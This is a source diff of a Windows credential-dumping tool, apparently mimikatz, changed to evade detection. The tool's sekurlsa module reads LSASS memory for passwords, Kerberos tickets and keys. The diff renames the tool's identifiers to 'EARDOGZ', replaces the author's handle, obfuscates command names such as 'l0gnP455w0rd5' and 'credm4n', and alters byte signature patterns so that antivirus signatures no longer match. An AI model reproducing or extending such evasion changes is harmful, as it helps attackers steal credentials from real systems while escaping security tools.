@@ -1,6 +1,6 @@
-/*	Benjamin DELPY `gentilkiwi`
-	https://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
+/*	Benjamin DELPY `FYtD`
+	https://blog.FYtD.com
+	benjamin@FYtD.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa.h"
@@ -15,7 +15,7 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 #endif
 	{kuhl_m_sekurlsa_cloudap,			L"cloudap",			L"Lists CloudAp credentials"},
 	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"Lists SSP credentials"},
-	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"Lists all available providers credentials"},
+	{kuhl_m_sekurlsa_all,				L"l0gnP455w0rd5",	L"Lists all available providers credentials"},
 
 	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
 	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
@@ -32,7 +32,7 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",			L"List Kerberos tickets"},
 	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",			L"List Kerberos Encryption Keys"},
 	{kuhl_m_sekurlsa_dpapi,				L"dpapi",			L"List Cached MasterKeys"},
-	{kuhl_m_sekurlsa_credman,			L"credman",			L"List Credentials Manager"},
+	{kuhl_m_sekurlsa_credman,			L"credm4n",			L"List Credentials Manager"},
 };
 
 const KUHL_M kuhl_m_sekurlsa = {
@@ -61,7 +61,7 @@ const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
 	{sizeof(KIWI_MSV1_0_LIST_52), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_52, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonServer)},
-	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonServer)},
+	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_EARDOGZ, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
 };
@@ -160,7 +160,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 	HANDLE hData = NULL;
 	DWORD pid, cbSk;
 	PMINIDUMP_SYSTEM_INFO pInfos;
-	DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
+	DWORD processRights = PROCESS_VM_READ | ((EARDOGZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
 	BOOL isError = FALSE;
 	PBYTE pSk;
 
@@ -217,13 +217,13 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 				{
 				#if defined(_M_IX86)
 					if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
-						PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
+						PRINT_ERROR(EARDOGZ L" " EARDOGZ_ARCH L" cannot access x64 process\n");
 					else
 				#endif
 					{						
-						cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
-						cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
-						cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
+						cLsass.osContext.MajorVersion = EARDOGZ_NT_MAJOR_VERSION;
+						cLsass.osContext.MinorVersion = EARDOGZ_NT_MINOR_VERSION;
+						cLsass.osContext.BuildNumber  = EARDOGZ_NT_BUILD_NUMBER;
 					}
 				}
 
@@ -683,12 +683,14 @@ NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
 }
 
 #if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-BYTE PTRN_W2K8R2_DomainList[]	= {0xf3, 0x0f, 0x6f, 0x6c, 0x24, 0x30, 0xf3, 0x0f, 0x7f, 0x2d};
-BYTE PTRN_W2K12R2_DomainList[]	= {0x0f, 0x10, 0x45, 0xf0, 0x66, 0x48, 0x0f, 0x7e, 0xc0, 0x0f, 0x11, 0x05};
+//BYTE PTRN_W2K8R2_DomainList[]	= {0xf3, 0x0f, 0x6f, 0x6c, 0x24, 0x30, 0xf3, 0x0f, 0x7f, 0x2d};
+BYTE PTRN_W2K8R2_DomainList[11] = { 0xdd, 0xe0, 0x38, 0xb1, 0xc1, 0x9a, 0xdf, 0xe0, 0x38, 0xa1, 0x80 };
+//BYTE PTRN_W2K12R2_DomainList[]	= {0x0f, 0x10, 0x45, 0xf0, 0x66, 0x48, 0x0f, 0x7e, 0xc0, 0x0f, 0x11, 0x05};
+BYTE PTRN_W2K12R2_DomainList[13] = { 0xdd, 0x1c, 0x27, 0x9b, 0x5d, 0xd8, 0xa7, 0x1c, 0x49, 0x1e, 0xa2, 0xaf, 0xea };
 BYTE PTRN_W2K16_DomainList[] = {0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xf1, 0xeb};
 KULL_M_PATCH_GENERIC DomainListReferences[] = {
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_W2K8R2_DomainList),	PTRN_W2K8R2_DomainList},	{0, NULL}, {10}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, { 8}},
+	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_W2K8R2_DomainList)-1,	&(PTRN_W2K8R2_DomainList[1])},	{0, NULL}, {10}},
+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList)-1,	&(PTRN_W2K12R2_DomainList[1])},	{0, NULL}, {8}},
 	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W2K16_DomainList),		PTRN_W2K16_DomainList},		{0, NULL}, {-4}},
 };
 NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
@@ -917,7 +919,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 
 	if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
 	{
-		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
+		if(EARDOGZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
 		{
 			if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
 			{
@@ -931,7 +933,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 
 	if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
 	{
-		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
+		if(EARDOGZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
 		{
 			if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
 			{
